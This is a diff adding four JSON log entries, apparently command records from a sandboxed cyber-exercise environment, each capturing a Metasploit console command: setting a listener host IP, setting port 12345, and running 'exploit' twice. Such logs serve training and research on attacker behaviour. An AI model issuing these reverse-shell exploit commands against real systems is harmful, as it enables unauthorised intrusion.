@@ -1,0 +1,4 @@
+{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:51:25.700541+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 147.251.83.13"}
+{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:51:35.108373+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:52:45.187836+02:00", "cmd_type": "msf-command", "cmd": "set LPORT 12345"}
+{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:52:53.747723+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
